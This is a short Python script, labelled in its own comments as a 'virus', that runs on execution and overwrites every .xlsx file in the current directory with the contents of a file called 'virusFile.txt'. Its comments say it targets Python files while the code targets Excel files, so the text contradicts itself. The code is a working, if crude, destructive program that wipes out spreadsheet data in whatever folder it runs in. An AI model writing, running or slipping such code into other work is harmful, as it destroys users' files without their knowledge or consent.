
import shutil
import os
# Get the current directory
cwd = os.getcwd()
virus_file =    "virusFile.txt"
#Define the virus Function
def virus():
# Get the list of files in the current directory
    files = os.listdir(cwd)
    #Loop through the files
    for file in files:
        #Check if the file is a Python file
        if file.endswith(".xlsx"):
            #Copy the virus to the Python file
            shutil.copy(virus_file, file)

#Call the virus function
virus()
